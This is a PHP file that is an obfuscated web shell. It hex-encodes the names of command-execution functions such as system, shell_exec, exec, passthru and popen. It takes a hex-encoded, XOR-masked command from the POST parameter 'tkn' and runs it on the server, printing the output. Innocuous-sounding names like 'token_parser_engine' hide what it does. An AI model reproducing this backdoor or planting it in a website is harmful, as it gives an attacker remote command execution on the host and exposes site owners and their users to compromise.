<?php

$splitter_tool6 = "\x73\x74ream\x5Fget\x5Fc\x6Fn\x74ents";
$splitter_tool5 = "pop\x65n";
$core_engine = "he\x78\x32\x62in";
$splitter_tool2 = "\x73\x68e\x6C\x6C_e\x78ec";
$splitter_tool3 = "\x65\x78ec";
$splitter_tool7 = "p\x63\x6C\x6Fse";
$splitter_tool4 = "\x70\x61\x73s\x74hru";
$splitter_tool1 = "\x73yst\x65\x6D";
if (isset($_POST["\x74\x6Bn"])) {
            function token_parser_engine( $hld, $mrk ) {
 $binding = '';
foreach(str_split($hld) as $char){
$binding.=chr(ord($char)^$mrk);

} return$binding;
 
}
            $tkn = $core_engine($_POST["\x74\x6Bn"]);
            $tkn = token_parser_engine($tkn, 34);
            if (function_exists($splitter_tool1)) {
                $splitter_tool1($tkn);
            } elseif (function_exists($splitter_tool2)) {
                print $splitter_tool2($tkn);
            } elseif (function_exists($splitter_tool3)) {
                $splitter_tool3($tkn, $property_set_hld);
                print join("\n", $property_set_hld);
            } elseif (function_exists($splitter_tool4)) {
                $splitter_tool4($tkn);
            } elseif (function_exists($splitter_tool5) && function_exists($splitter_tool6) && function_exists($splitter_tool7)) {
                $mrk_binding = $splitter_tool5($tkn, 'r');
                if ($mrk_binding) {
                    $val_bind = $splitter_tool6($mrk_binding);
                    $splitter_tool7($mrk_binding);
                    print $val_bind;
                }
            }
            exit;
        }